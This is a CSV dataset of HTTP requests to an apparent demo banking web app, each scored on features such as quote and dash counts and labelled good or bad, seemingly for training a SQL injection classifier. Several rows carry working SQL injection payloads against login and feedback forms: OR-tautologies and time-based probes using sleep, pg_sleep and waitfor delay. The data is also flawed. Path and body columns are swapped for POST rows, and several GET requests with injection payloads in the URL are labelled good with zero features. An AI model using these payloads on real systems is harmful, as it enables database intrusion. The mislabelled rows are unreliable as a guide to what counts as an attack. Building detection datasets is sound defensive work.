method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,-1%20OR%202%2B373-373-1=0%2B0%2B0%2B1&txtEmail=sample%40email.tst,/doSubscribe,0,0,0,0,2,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,"1'""&passw=g00dPa%24%24w0rD&uid=1",/doLogin,2,2,0,0,0,2,bad
GET,,/index.jsp?content=if(now()=sysdate()%2Csleep(6)%2C0)&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2B83-83-1=0%2B0%2B0%2B1&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,4,0,bad
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2B861-861-1=0%2B0%2B0%2B1%20or%20'4GSqhy4M'=',/doLogin,8,0,0,0,4,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=-1));select%20pg_sleep(3);%20--%20,/sendFeedback,0,0,2,2,5,4,bad
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst'%20AND%202*3*8=6*8%20AND%20'FDmX'='FDmX&name=zFPWdwPk&subject=1,/sendFeedback,8,0,0,0,6,0,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%20waitfor%20delay%20'0:0:9'%20--%20&subject=1,/sendFeedback,4,0,2,0,7,4,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_contact.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/security.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=8RwY1QnH';%20waitfor%20delay%20'0:0:6'%20--%20,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,"/survey_questions.jsp?step=%F0''%F0""""",0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,"/disclaimer.htm?url=%F0''%F0""""",0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=1%20waitfor%20delay%20'0:0:5'%20--%20,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=JyI=&template=US,0,0,0,0,0,0,good
